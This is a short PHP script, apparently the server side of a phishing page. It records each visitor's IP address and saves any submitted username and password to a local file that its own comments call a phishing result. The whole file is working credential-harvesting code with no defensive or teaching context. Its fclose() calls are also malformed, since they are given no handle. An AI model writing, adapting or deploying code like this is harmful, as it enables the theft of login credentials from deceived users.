<?php


// get client ip
$ip = $_SERVER['HTTP_CLIENT_IP'];
// send client ip to ip.txt file
$i = fopen('../../output/ip.txt', "w+");
fputs($i, $ip);
fclose();


// send phising result to phising.txt file
$a = fopen("../../output/phising.txt", "w+");
fputs($a, '');
fclose();


if(isset($_POST['login'])){
    // 
    $user = $_POST['user'];
    $pass = $_POST['pass'];
    
    
    $p = "[>] Username : ".$user."\n[?] Password : ".$pass;
    $d = fopen("../../output/phising.txt", "w+");
    fputs($d, $p);
    fclose();
}
?>